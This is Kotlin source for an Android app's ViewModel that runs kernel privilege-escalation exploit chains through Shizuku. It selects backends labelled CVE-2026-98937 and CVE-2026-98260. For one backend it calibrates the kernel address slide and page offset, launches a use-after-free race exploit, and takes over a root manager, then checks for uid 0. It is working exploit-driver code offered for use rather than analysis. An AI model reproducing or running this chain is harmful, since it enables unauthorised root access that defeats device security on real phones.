package com.extractkit.app

import android.app.Application
import android.content.Context
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateListOf
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.setValue
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.viewModelScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

/** Shizuku 的四种可用状态，决定了横幅文案与点击行为。 */
internal enum class ShellState { ABSENT, NO_PERM, GRANTED, CONNECTED }

internal enum class BannerAction { NONE, INSTALL_SHIZUKU, REQUEST_PERM, OPEN_MANAGER, SHOW_LOG }

internal data class Banner(
    val title: String,
    val sub: String,
    val accent: Long,
    val action: BannerAction,
)

/** 纯函数，便于单测：把内部状态翻译成横幅。 */
internal fun bannerFor(
    shell: ShellState,
    rooted: Boolean,
    busy: Boolean,
    stage: String,
    lastFail: String?,
): Banner = when {
    busy -> Banner("执行中", stage.ifBlank { "正在准备…" }, 0xFF9A6A00, BannerAction.SHOW_LOG)
    // 失败但还没拿到 shell 上下文：点状态栏先申请授权，别直接甩一屏日志
    lastFail != null && shell != ShellState.CONNECTED ->
        Banner("需要授权", "点这里申请 Shizuku 权限后重试", 0xFF9A6A00, BannerAction.REQUEST_PERM)
    lastFail != null -> Banner("未成功", lastFail, 0xFFC2410C, BannerAction.SHOW_LOG)
    rooted -> Banner("已提权", "su 可用，点这里打开管理器", 0xFF12A150, BannerAction.OPEN_MANAGER)
    shell == ShellState.ABSENT ->
        Banner("环境受限", "未检测到 Shizuku，点这里安装", 0xFF9A6A00, BannerAction.INSTALL_SHIZUKU)
    shell == ShellState.NO_PERM ->
        Banner("需要授权", "点这里给 Shizuku 授权后重试", 0xFF9A6A00, BannerAction.REQUEST_PERM)
    else -> Banner("就绪", "点下方按钮开始", 0xFF12A150, BannerAction.NONE)
}

internal fun shouldAutoOpenManager(ok: Boolean, rooted: Boolean, pkg: String?): Boolean =
    ok && rooted && !pkg.isNullOrBlank()

internal fun backendOf(pref98937: Boolean): String =
    if (pref98937) "CVE-2026-98937" else "CVE-2026-98260"

/**
 * 首页的执行宿主：环境探测、Shizuku 授权、跑链、失败原因、成功后跳管理器。
 * 逻辑放 ViewModel 里，旋转屏幕/切后台都不会把正在跑的链丢掉。
 */
internal class RunModel(app: Application) : AndroidViewModel(app) {

    private val store = LogStore(app)

    private val engine = ExtractEngine(app, ::log, ::stage)

    var shellState by mutableStateOf(ShellState.ABSENT)
        private set
    var rooted by mutableStateOf(false)
        private set
    var busy by mutableStateOf(false)
        private set
    var stage by mutableStateOf("")
        private set
    var lastFail by mutableStateOf<String?>(null)
        private set

    val logs = mutableStateListOf<String>()

    /** 成功后要打开的包名；Activity 消费后置空。 */
    var openManager by mutableStateOf<String?>(null)
        private set

    val banner: Banner
        get() = bannerFor(shellState, rooted, busy, stage, lastFail)

    /** 只有点过「开始提权」才落盘；平时打开软件不生成日志文件。 */
    private var persistLogs = false

    fun log(line: String) {
        ringAppend(logs, line, 600)
        if (persistLogs) store.append(line)
    }

    private fun stage(text: String) {
        stage = text
    }

    /** 探测一次环境；从管理器/标定页回来、授权回调后都要调。 */
    fun refresh() {
        viewModelScope.launch {
            val state = withContext(Dispatchers.IO) {
                when {
                    !Shell.alive() -> ShellState.ABSENT
                    !Shell.granted() -> ShellState.NO_PERM
                    Shell.connected() -> ShellState.CONNECTED
                    else -> ShellState.GRANTED
                }
            }
            shellState = state
            if (state == ShellState.GRANTED) {
                // 授权了但还没连上，顺手连一次，省得用户点按钮才等
                withContext(Dispatchers.IO) { runCatching { Shell.connect(getApplication()) } }
                if (Shell.connected()) shellState = ShellState.CONNECTED
            }
            rooted = if (shellState == ShellState.CONNECTED) {
                withContext(Dispatchers.IO) { runCatching { engine.hasRootNow() }.getOrDefault(false) }
            } else {
                // Shizuku 不可用时退回直接问 su（KSU 已接管的情况）
                withContext(Dispatchers.IO) { runCatching { probeSuDirectly() }.getOrDefault(false) }
            }
            // 注意：不要因为「su 现在能用」就把刚才的失败擦掉（那是上一次诊断的证据）
            if (AppState.needsReprobe) {
                AppState.needsReprobe = false
                log("· 环境已变化，重新探测")
            }
        }
    }

    fun requestPermission() {
        val alive = runCatching { Shell.alive() }.getOrDefault(false)
        if (!alive) {
            log("! Shizuku 没在运行：先打开 Shizuku 并「启动」，再回来点这里")
            stage = "Shizuku 未运行"
            refresh()
            return
        }
        Shell.requestPermission()
        log("· 已请求 Shizuku 授权，授权框消失后会自动刷新")
        stage = "等待 Shizuku 授权"
    }

    fun consumeOpenManager(): String? {
        val pkg = openManager
        openManager = null
        return pkg
    }

    /**
     * 跑一次链。98260 走自带 payload；98937 目前仍由旧入口承担（下一步迁），
     * 这里先给出明确提示，避免静默什么都不做。
     */
    fun start(managerPkg: String?) {
        if (busy) return
        // 点「开始提权」才开始记日志（含新建文件），打开软件时不生成
        persistLogs = true
        lastFail = null
        busy = true
        stage = "准备"
        viewModelScope.launch {
            try {
                if (managerPkg.isNullOrBlank()) {
                    lastFail = "没检测到根管理器，先长按「根管理器」指定一个"
                    return@launch
                }
                if (!engine.ensureShell()) {
                    lastFail = "Shizuku 未连接：${Shell.error() ?: "请先启动 Shizuku 并授权"}"
                    return@launch
                }
                val use98937 = getApplication<Application>()
                    .getSharedPreferences("backend", Context.MODE_PRIVATE)
                    .getBoolean("use98937", false)
                if (use98937) {
                    run98937(managerPkg)
                    return@launch
                }
                val safeMode = getApplication<Application>()
                    .getSharedPreferences("run", Context.MODE_PRIVATE)
                    .getBoolean("safe_mode", false)
                if (safeMode) log("· 安全模式：开")
                log("==== 开始：一键 · 提取（uid0） ====")
                log("· 目标管理器：$managerPkg")
                val mode = Modes.byId("chain_uid0")
                val outcome = engine.run(mode, false, ::stage, managerPkg, safeMode)
                log("---- 结果：${outcome.stage} · ok=${outcome.ok} ----")
                if (!outcome.detail.isBlank()) log(outcome.detail)
                val okRoot = withContext(Dispatchers.IO) { runCatching { engine.hasRootNow() }.getOrDefault(false) }
                rooted = okRoot
                if (shouldAutoOpenManager(outcome.ok, okRoot, managerPkg)) {
                    log("✓ 已提权，打开管理器")
                    openManager = managerPkg
                } else {
                    lastFail = outcome.stage.ifBlank { "未确认 uid=0" }
                    log("! 未成功：$lastFail")
                }
            } catch (t: Throwable) {
                lastFail = t.message ?: t.javaClass.simpleName
                log("! 异常：${t.message ?: t.javaClass.simpleName}")
            } finally {
                busy = false
                stage = ""
                refresh()
            }
        }
    }

    /**
     * 98937 后端：calibrate-a 拿 slide → calibrate-b 拿 page_offset → exploit → ksu-takeover。
     * 任何一步失败都把原因写进 lastFail，日志逐行可见。
     */
    private suspend fun run98937(managerPkg: String) {
        val app = getApplication<Application>()
        val release = System.getProperty("os.version").orEmpty()
        val table = Cve98937Tables.match(app, release)
        if (table == null) {
            lastFail = "本机没有 98937 内核表（$release），切回 98260"
            log("! 没有 98937 内核表：$release")
            return
        }
        log("==== 开始：98937 · ${table.release} ====")
        log("· 目标管理器：$managerPkg")

        val allowed = Cve98937.tracefsAllowed(app)
        log("· tracefs 自检：${if (allowed) "可用" else "受限（可能拿不到真地址）"}")

        if (!Cve98937.deploy(app, ::log)) {
            lastFail = "98937 后端部署失败"
            return
        }

        // 1) slide
        stage = "98937 · 校准 slide"
        val (okA, outA) = Cve98937.run(app, table, "calibrate-a", ::log)
        val slideHex = Regex("slide=(0x[0-9a-fA-F]+)").find(outA)?.groupValues?.get(1)
            ?: Regex("_text=(0x[0-9a-fA-F]+)").find(outA)?.groupValues?.get(1)
                ?.let { base ->
                    val text = java.lang.Long.parseUnsignedLong(base.removePrefix("0x"), 16)
                    val slide = text - java.lang.Long.parseUnsignedLong("ffffffc080000000", 16)
                    "0x" + java.lang.Long.toHexString(slide)
                }
        if (!okA || slideHex == null) {
            lastFail = "98937 校准 slide 失败"
            return
        }
        log("· slide=$slideHex")

        // 2) page_offset
        stage = "98937 · 校准 page_offset"
        val (okB, outB) = Cve98937.run(app, table, "calibrate-b", ::log)
        val pageHex = Regex("page_offset=(0x[0-9a-fA-F]+)").find(outB)?.groupValues?.get(1)
            ?: "0xffffff7f80000000"
        if (!okB) log("! page_offset 没解析出来，用默认 $pageHex")

        // 3) exploit（会 fork 后台 probe，必须 detached 轮询）
        stage = "98937 · 注入"
        val params = Cve98937.params(app)
        val args = params.exploitArgs(slideHex, pageHex)
        val (okE, outE) = Cve98937.runDetached(
            app, table, args, ::log,
            timeoutMs = params.waitSec * 1000L,
        )
        if (!okE) {
            lastFail = if (outE.contains("captured=0")) {
                "98937 UAF 竞速全丢（captured=0），这台多半锁不住页"
            } else {
                "98937 注入未成功"
            }
            return
        }

        // 4) 接管管理器
        val rootedNow = withContext(Dispatchers.IO) { runCatching { engine.hasRootNow() }.getOrDefault(false) }
        if (!rootedNow) {
            stage = "98937 · 接管管理器"
            Cve98937.run(app, table, "ksu-takeover", ::log)
        }
        val okRoot = withContext(Dispatchers.IO) { runCatching { engine.hasRootNow() }.getOrDefault(false) }
        rooted = okRoot
        if (okRoot) {
            log("✓ 已提权（98937），打开管理器")
            openManager = managerPkg
        } else {
            lastFail = "98937 注入了但没拿到 root（管理器没接管）"
            log("! $lastFail")
        }
    }

    private fun probeSuDirectly(): Boolean = parseSuUid(
        runCatching {
            val p = ProcessBuilder("/system/bin/sh", "-c", "su -c id 2>/dev/null || /system/bin/su -c id 2>/dev/null")
                .redirectErrorStream(true)
                .start()
            val out = p.inputStream.bufferedReader().readText()
            p.waitFor()
            out
        }.getOrDefault("")
    )
}
